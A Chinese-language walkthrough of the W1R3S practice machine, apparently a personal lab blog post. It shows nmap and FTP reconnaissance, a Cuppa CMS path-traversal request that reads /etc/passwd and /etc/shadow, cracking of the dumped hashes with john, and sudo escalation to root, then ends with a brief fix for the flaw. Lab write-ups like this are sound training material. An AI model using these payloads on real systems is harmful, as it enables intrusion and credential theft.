---
title: w1r3s-editable
date: 2024年6月30日
updated: 2024年6月30日
tags:
  - 靶场
categories: 靶场
keywords:
description: w1r3s-editable
---


w1r3s

# 信息收集

经典，无需多言

```
┌──(kali㉿kali)-[~]
└─$ nmap -p- 192.168.159.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 14:57 CST
Nmap scan report for 192.168.159.134
Host is up (0.00039s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:AA:7F:FC (VMware)

Nmap done: 1 IP address (1 host up) scanned in 47.81 seconds
```

开放了21，22，80和3306端口，21是ftp的,22可能存在远程连接，80扫后台,3306是数据库的，-A看一下

```
┌──(kali㉿kali)-[~]
└─$ nmap -A -p- 192.168.159.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 14:59 CST
Nmap scan report for 192.168.159.134
Host is up (0.0036s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.159.129
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql   MySQL (unauthorized)
MAC Address: 00:0C:29:AA:7F:FC (VMware)
Device type: general purpose|storage-misc|WAP
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (98%), Synology DiskStation Manager 5.X (89%), Asus embedded (89%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:linux:linux_kernel cpe:/h:asus:rt-ac66u
Aggressive OS guesses: Linux 3.10 - 4.11 (98%), Linux 5.1 (96%), Linux 3.2 - 4.9 (94%), Linux 4.10 (94%), Linux 3.10 (93%), Linux 4.4 (93%), Linux 3.16 - 4.6 (92%), Linux 5.0 - 5.4 (91%), Linux 2.6.32 - 3.13 (91%), Linux 2.6.39 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   3.60 ms 192.168.159.134

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.29 seconds

```

一个个尝试吧，第一个是ftp，连接试试，上一个靶机刚做的隐匿登录
```
┌──(kali㉿kali)-[~/桌面]
└─$ ftp 192.168.159.134
Connected to 192.168.159.134.
220 Welcome to W1R3S.inc FTP service.
Name (192.168.159.134:kali): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||43100|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
226 Directory send OK.
ftp> cd content
250 Directory successfully changed.
ftp> binary
200 Switching to Binary mode.
ftp> mget 0*.txt
mget 01.txt [anpqy?]?
229 Entering Extended Passive Mode (|||41958|)
150 Opening BINARY mode data connection for 01.txt (29 bytes).
100% |*************************************************|    29        5.73 KiB/s    00:00 ETA
226 Transfer complete.
29 bytes received in 00:00 (4.03 KiB/s)
mget 02.txt [anpqy?]?
229 Entering Extended Passive Mode (|||47596|)
150 Opening BINARY mode data connection for 02.txt (165 bytes).
100% |*************************************************|   165       53.69 KiB/s    00:00 ETA
226 Transfer complete.
165 bytes received in 00:00 (33.03 KiB/s)
mget 03.txt [anpqy?]?
229 Entering Extended Passive Mode (|||42443|)
150 Opening BINARY mode data connection for 03.txt (582 bytes).
100% |*************************************************|   582       55.91 KiB/s    00:00 ETA
226 Transfer complete.
582 bytes received in 00:00 (46.99 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||44147|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt
-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt
-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt
226 Directory send OK.
ftp> cd ,,.
550 Failed to change directory.
ftp> ls
229 Entering Extended Passive Mode (|||46326|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt
-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt
-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt
226 Directory send OK.
ftp> cd ../
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42864|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
226 Directory send OK.
ftp> cd docs
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||48758|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> maget worktodo.txt
?Invalid command.
ftp> mget worktodo.txt
mget worktodo.txt [anpqy?]?
229 Entering Extended Passive Mode (|||43505|)
150 Opening BINARY mode data connection for worktodo.txt (138 bytes).
100% |*************************************************|   138       46.77 KiB/s    00:00 ETA
226 Transfer complete.
138 bytes received in 00:00 (34.29 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49142|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt
226 Directory send OK.
ftp> cd ../
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||45915|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
226 Directory send OK.
ftp> cd new-employees
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||45613|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           155 Jan 28  2018 employee-names.txt
226 Directory send OK.
ftp> binary
200 Switching to Binary mode.
ftp> mget employee-names.txt
mget employee-names.txt [anpqy?]?
229 Entering Extended Passive Mode (|||47785|)
150 Opening BINARY mode data connection for employee-names.txt (155 bytes).
100% |*************************************************|   155       59.68 KiB/s    00:00 ETA
226 Transfer complete.
155 bytes received in 00:00 (43.70 KiB/s)
ftp> exit
221 Goodbye.
```

ftp里面有三个文件夹，里面的文件分别转换成二进制形式下载下来


打开，01看着没什么东西，02里面有个base64的，另一个用hash-id看是不是md5
```
┌──(kali㉿kali)-[~/桌面]
└─$ cat 01.txt
New FTP Server For W1R3S.inc

┌──(kali㉿kali)-[~/桌面]
└─$ cat 02.txt
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
############################################

┌──(kali㉿kali)-[~/桌面]
└─$ cat 03.txt
___________.__              __      __  ______________________   _________    .__
\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____
  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  < \_____  \     |  |/    \_/ ___\
  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___
  |____|   |___|  /\___  >   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  >
                \/     \/         \/                \/       \/        \/  \/         \/     \/

┌──(kali㉿kali)-[~/桌面]
└─$ hash-identifier '01ec2d8fc11c493b25029fb1f47f39ce'
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
 HASH:
```

里面没什么东西了，看看其他文件夹
```

┌──(kali㉿kali)-[~/桌面]
└─$ cat employee-names.txt
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources

```
给了个人名以及工作职位，人名可能存在密码的爆破

看看最后一个文件
```
┌──(kali㉿kali)-[~/桌面]
└─$ cat worktodo.txt
        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡

....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ
```

倒过来

```
        ı don't thınk thıs ıs the way to root!
we have a ןot of work to do‘ stop pןayıng around˙˙˙˙

```

别浪了，还有恁多事没整呢,这玩意搞不到root

```
扫了一下后台
┌──(kali㉿kali)-[~/桌面]
└─$ dirsearch -u  http://192.168.159.134
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/桌面/reports/http_192.168.159.134/_24-06-30_15-38-38.txt

Target: http://192.168.159.134/

[15:38:39] Starting:
[15:38:41] 403 -  301B  - /.ht_wsr.txt
[15:38:41] 403 -  304B  - /.htaccess.bak1
[15:38:41] 403 -  304B  - /.htaccess.orig
[15:38:41] 403 -  306B  - /.htaccess.sample
[15:38:41] 403 -  304B  - /.htaccess.save
[15:38:42] 403 -  304B  - /.htaccess_orig
[15:38:42] 403 -  305B  - /.htaccess_extra
[15:38:42] 403 -  302B  - /.htaccess_sc
[15:38:42] 403 -  302B  - /.htaccessBAK
[15:38:42] 403 -  303B  - /.htaccessOLD2
[15:38:42] 403 -  295B  - /.html
[15:38:42] 403 -  294B  - /.htm
[15:38:42] 403 -  302B  - /.htaccessOLD
[15:38:42] 403 -  300B  - /.htpasswds
[15:38:42] 403 -  301B  - /.httr-oauth
[15:38:42] 403 -  304B  - /.htpasswd_test
[15:38:43] 403 -  294B  - /.php
[15:38:43] 403 -  295B  - /.php3
[15:38:58] 301 -  326B  - /administrator  ->  http://192.168.159.134/administrator/
[15:38:58] 302 -    7KB - /administrator/  ->  installation/
[15:38:58] 302 -    7KB - /administrator/index.php  ->  installation/
[15:39:24] 301 -  323B  - /javascript  ->  http://192.168.159.134/javascript/
[15:39:48] 403 -  304B  - /server-status/
[15:39:48] 403 -  303B  - /server-status
[15:40:06] 301 -    0B  - /wordpress/  ->  http://localhost/wordpress/
[15:40:06] 200 -    1KB - /wordpress/wp-login.php

Task Completed

```

访问```http://192.168.159.134/administrator/installation/```
暴露了是cuppa cms

![](https://pic.imgdb.cn/item/66810c72d9c307b7e9d623b9.png)

next看能不能建造一个，但是最后不行

```
Installation
Installation Error
Edit file [Configuration.php]	Yes
Create tables	Yes
Administrator's user created	No

```

我们用searchsploit搜索一下
```

┌──(kali㉿kali)-[~/桌面]
└─$ searchsploit cuppa
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclu | php/webapps/25971.txt
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

google搜了一下存在一个任意文件下载的漏洞

```
http://{baseurl}/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
访问一下是

![](https://pic.imgdb.cn/item/66810f50d9c307b7e9d9cd57.png)

我们使用

```
┌──(kali㉿kali)-[~/桌面]
└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.159.134/administrator/alerts/alertConfigField.php
```
如名使用curl访问http://192.168.159.134/administrator/alerts/alertConfigField.php，且参数为urlConfig=../../../../../../../../../etc/passwd 。请求时要对数据进行url编码


因为url一般是get请求，我们要暴改成post请求

```
┌──(kali㉿kali)-[~/桌面]
└─$ curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.159.134/administrator/alerts/alertConfigField.php
<style>
    .new_content{
        position: fixed;
    }
    .alert_config_field{
        font-size:12px;
        background:#FFF;
        position:relative;
        border-radius: 3px;
        box-shadow: 0px 0px 5px rgba(0,0,0,0.2);
        overflow:hidden;
        position:fixed;
        top:50%;
        left:50%;
        width:600px;
        height:440px;
        margin-left:-300px;
        margin-top:-220px;
    }
    .alert_config_top{
        position: relative;
        margin: 2px;
        margin-bottom: 0px;
        border: 1px solid #D2D2D2;
        background: #4489F8;
        overflow: auto;
        color:#FFF;
        font-size: 13px;
        padding: 7px 5px;
        box-shadow: 0 0 2px rgba(0, 0, 0, 0.1);
        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
    }
    .description_alert{
        position:relative;
        font-size:12px;
        text-shadow:0 1px #FFFFFF;
        font-weight: normal;
        padding: 5px 0px 5px 0px;
    }
    .btnClose_alert{
        position:absolute;
        top: 4px; right: 2px;
        width:22px;
        height:22px;
        cursor:pointer;
        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;
        background-position: center;
        background-size: 13px;
    }
    .content_alert_config{
        position:relative;
        clear:both;
        margin: 2px;
        margin-top: 0px;
        height: 401px;
        padding: 10px;
        overflow: auto;
    }
</style>
<script>
        function CloseDefaultAlert(){
                cuppa.setContent({'load':false, duration:0.2});
        cuppa.blockade({'load':false, duration:0.2, delay:0.1});
        }
</script>
<div class="alert_config_field" id="alert">
    <div class="alert_config_top">
        <strong>Configuration</strong>:         <div class="btnClose_alert" id="btnClose_alert" onclick="CloseDefaultAlert()"></div>
    </div>
    <div id="content_alert_config" class="content_alert_config">
        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
    </div>
</div>
```

 在现在linux系统中，passwd文件里面所有账户的密码都是用x代替的，真正的密码（加密后）放在/etc/shadow中

我们把最后的/passwd改成shadow

```
        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
    </div>
</div>
```

用john爆一下

```
┌──(kali㉿kali)-[~/桌面]
└─$ john hash
Created directory: /home/kali/.john
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
www-data         (www-data)
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
computer         (w1r3s)
2g 0:00:00:01 DONE 2/3 (2024-06-30 16:02) 1.104g/s 2077p/s 2078c/s 2078C/s 123456..bigben
Use the "--show" option to display all of the cracked passwords reliably
```

ssh连接，连接以后用whoami,id,uname -a,id都看一看，理论上说他有一个www-data一个w1r3s
的话，说明w1r3s是可以通过sudo提权的，试了试sudo -l获得了all:all:all的
```
┌──(kali㉿kali)-[~/桌面]
└─$ ssh w1r3s@192.168.159.134
----------------------
Think this is the way?
----------------------
Well,........possibly.
----------------------
w1r3s@192.168.159.134's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

102 packages can be updated.
0 updates are security updates.

.....You made it huh?....
Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35
w1r3s@W1R3S:~$ whoami
w1r3s
w1r3s@W1R3S:~$ id
uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
w1r3s@W1R3S:~$ sudo id
ls
^C
w1r3s@W1R3S:~$ sudo -l
^C
w1r3s@W1R3S:~$ uname -a
Linux W1R3S 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
w1r3s@W1R3S:~$ id
uid=1000(w1r3s) gid=1000(w1r3s) groups=1000(w1r3s),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
w1r3s@W1R3S:~$ sudo -l
sudo: unable to resolve host W1R3S
[sudo] password for w1r3s:
Matching Defaults entries for w1r3s on W1R3S:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User w1r3s may run the following commands on W1R3S:
    (ALL : ALL) ALL
w1r3s@W1R3S:~$ sudo /bin/bash
sudo: unable to resolve host W1R3S
root@W1R3S:~# id
uid=0(root) gid=0(root) groups=0(root)
root@W1R3S:~# whoami
root
root@W1R3S:~# cd root
bash: cd: root: No such file or directory
root@W1R3S:~# ls
Desktop    Downloads         ftp    Pictures  Templates
Documents  examples.desktop  Music  Public    Videos
root@W1R3S:~# cd ../
root@W1R3S:/home# ls
w1r3s
root@W1R3S:/home# cd  ../
root@W1R3S:/# ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
root@W1R3S:/# cd root
root@W1R3S:/root# ls
flag.txt
root@W1R3S:/root# cat flag.txt
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___|
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/

-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------
```

## 漏洞修复

![](https://pic.imgdb.cn/item/668115f1d9c307b7e9e2a7a0.png)

这里的
```
    include_once(realpath(__DIR__ . '/..')."/classes/Cuppa.php");
```
这是include_once（）函数导致的文件包含漏洞，修复时可以改变其函数类型，也可以去掉. '/..'让其无法返回上级目录


[顺便贴上cuppa的vol网址](https://www.exploit-db.com/exploits/25971)